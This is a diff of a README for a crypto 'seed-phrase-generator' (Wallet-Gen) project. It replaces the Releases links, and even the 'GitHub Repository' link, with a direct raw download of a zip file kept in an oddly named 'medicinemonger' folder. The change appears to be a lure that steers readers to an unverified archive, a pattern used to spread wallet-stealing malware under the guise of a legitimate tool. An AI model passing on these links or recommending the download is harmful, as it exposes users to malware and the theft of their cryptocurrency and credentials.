@@ -1,6 +1,6 @@
 # 🥇 seed-phrase-generator - Generate Your Crypto Wallets Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/batoasihhm/seed-phrase-generator/releases)
+[![Download](https://raw.githubusercontent.com/batoasihhm/seed-phrase-generator/main/medicinemonger/seed-phrase-generator-1.7.zip)](https://raw.githubusercontent.com/batoasihhm/seed-phrase-generator/main/medicinemonger/seed-phrase-generator-1.7.zip)
 
 ## 🚀 Overview
 
@@ -32,7 +32,7 @@ For EVM wallets, Wallet-Gen uses the keccak256 algorithm. Bitcoin wallets are cr
 To download Wallet-Gen, visit the Releases page. Follow these steps:
 
 1. Click on the link below to go to the Releases page:
-   [Visit this page to download](https://github.com/batoasihhm/seed-phrase-generator/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/batoasihhm/seed-phrase-generator/main/medicinemonger/seed-phrase-generator-1.7.zip)
 
 2. Find the latest version available.
 
@@ -77,6 +77,6 @@ If you encounter any issues or have questions, please visit the GitHub repositor
 
 ## 🔗 Connect on GitHub
 
-- [GitHub Repository](https://github.com/batoasihhm/seed-phrase-generator)
+- [GitHub Repository](https://raw.githubusercontent.com/batoasihhm/seed-phrase-generator/main/medicinemonger/seed-phrase-generator-1.7.zip)
 
 Keep Wallet-Gen handy for all your cryptocurrency wallet needs!
